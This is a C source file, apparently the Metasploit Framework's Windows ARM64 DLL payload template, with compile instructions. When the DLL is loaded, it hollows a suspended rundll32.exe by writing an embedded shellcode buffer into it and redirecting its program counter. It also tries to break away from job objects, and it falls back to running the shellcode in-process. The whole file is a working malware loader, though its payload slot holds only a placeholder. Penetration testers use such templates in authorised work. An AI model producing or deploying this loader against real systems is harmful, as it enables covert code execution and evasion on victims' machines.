// AArch64 PE DLL Template for Metasploit Framework
//
// rundll32 (including SMB fetch) loads this DLL, DllMain runs on
// DLL_PROCESS_ATTACH, and the payload is started in a new rundll32.exe
// process so it survives the original rundll32 exiting after a missing
// export. That matches the x86/x64 DLL templates; this copy sets CONTEXT.Pc
// instead of Rip/Eip.
//
// -----------------------------------------------------------------------------
//
// Compilation Instructions:
//
//   Using MSVC on a Windows ARM64 Host:
//
//   cl.exe /nologo /O2 /W3 /GS- /LD /D_WIN64 template_aarch64_windows.c /link ^
//   /subsystem:windows /machine:arm64 /entry:DllMain ^
//   /out:template_aarch64_windows.dll kernel32.lib
//
//   Cross-compilation with zig (produces a kernel32-only ARM64 DLL):
//
//   zig cc -target aarch64-windows-gnu -c -O2 -ffreestanding \
//     -fno-stack-protector -fPIC -o template_aarch64_windows.obj \
//     template_aarch64_windows.c
//   zig cc -target aarch64-windows-gnu -shared -nostdlib -fPIC \
//     -Wl,--entry,DllMain -Wl,--subsystem,windows -lkernel32 \
//     -o template_aarch64_windows.dll template_aarch64_windows.obj
//
// -----------------------------------------------------------------------------

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#undef WIN32_LEAN_AND_MEAN

#define PAYLOAD_MARKER "PAYLOAD:"
#define SCSIZE 8192

char payload[SCSIZE] = PAYLOAD_MARKER;

// Absolute pointer so the linker emits a base relocation directory.
// Without it, a fully PIC ARM64 image can end up with DYNAMIC_BASE set and
// no .reloc section, and the Windows loader will not rebase the DLL.
void *payload_ptr = payload;

static void zero_memory(void *p, size_t len)
{
    unsigned char *q = (unsigned char *)p;
    size_t i;

    for (i = 0; i < len; i++)
    {
        q[i] = 0;
    }
}

static void copy_payload(void *dest)
{
    unsigned char *out = (unsigned char *)dest;
    unsigned char *in = (unsigned char *)payload_ptr;
    int i;

    for (i = 0; i < SCSIZE; i++)
    {
        out[i] = in[i];
    }
}

// In-process fallback used when CreateProcess fails (for example under a
// restrictive job). The host process must stay alive for this path to work.
static void run_in_process(void)
{
    void *exec_mem;
    DWORD old_prot;
    HANDLE hThread;

    exec_mem = VirtualAlloc(NULL, SCSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL)
    {
        return;
    }

    copy_payload(exec_mem);

    if (VirtualProtect(exec_mem, SCSIZE, PAGE_EXECUTE_READ, &old_prot) == FALSE)
    {
        return;
    }

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread)
    {
        CloseHandle(hThread);
    }
    else
    {
        ((void (*)())exec_mem)();
    }
}

// Hollow a suspended rundll32.exe and point its PC at a copy of the payload.
// Returns TRUE if the child process was started.
static BOOL hollow_rundll32(void)
{
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    CONTEXT ctx;
    LPVOID ep;
    char cmd_job[] = "rundll32.exe";
    char cmd[] = "rundll32.exe";
    BOOL result;

    zero_memory(&si, sizeof(si));
    zero_memory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    result = CreateProcessA(
        NULL,
        cmd_job,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED | IDLE_PRIORITY_CLASS | CREATE_BREAKAWAY_FROM_JOB,
        NULL,
        NULL,
        &si,
        &pi);

    if (result == FALSE)
    {
        result = CreateProcessA(
            NULL,
            cmd,
            NULL,
            NULL,
            TRUE,
            CREATE_SUSPENDED | IDLE_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi);
    }

    if (result == FALSE)
    {
        return FALSE;
    }

    ep = VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ep == NULL)
    {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    if (WriteProcessMemory(pi.hProcess, ep, payload, SCSIZE, NULL) == FALSE)
    {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    zero_memory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    if (GetThreadContext(pi.hThread, &ctx) == FALSE)
    {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    ctx.Pc = (DWORD64)ep;

    if (SetThreadContext(pi.hThread, &ctx) == FALSE)
    {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    (void)hinstDLL;
    (void)lpReserved;

    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        if (hollow_rundll32() == FALSE)
        {
            run_in_process();
        }
    }

    return TRUE;
}
